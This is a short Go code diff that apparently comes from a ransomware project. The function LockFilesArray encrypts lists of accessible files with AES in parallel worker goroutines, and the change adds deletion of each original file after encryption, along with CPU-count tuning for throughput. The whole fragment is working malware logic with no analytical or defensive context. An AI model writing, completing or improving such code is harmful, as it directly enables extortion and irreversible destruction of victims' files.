@@ -71,12 +71,16 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 	return fileListWithAccess
 }
 
-func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []byte) {
+func LockFilesArray(filesToEncrypt []string, AESKey []byte) {
 	//scan only non hidden directories
 
 	// runtime.GOMAXPROCS(16)
 	numCPU := runtime.NumCPU()
-	runtime.GOMAXPROCS(numCPU - 2)
+	if numCPU >= 4 {
+		runtime.GOMAXPROCS(numCPU - 2)
+	} else {
+		runtime.GOMAXPROCS(1)
+	}
 
 	wg := sync.WaitGroup{}
 
@@ -90,7 +94,7 @@ func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []by
 			go func(index int) {
 				defer wg.Done()
 				_ = enc.EncryptFileAES(AESKey, filesToEncrypt[index])
-				//append file path to file named "encryptedFiles.txt"
+				os.Remove(filesToEncrypt[index])
 				filesProcessed++
 			}(i + j)
 		}
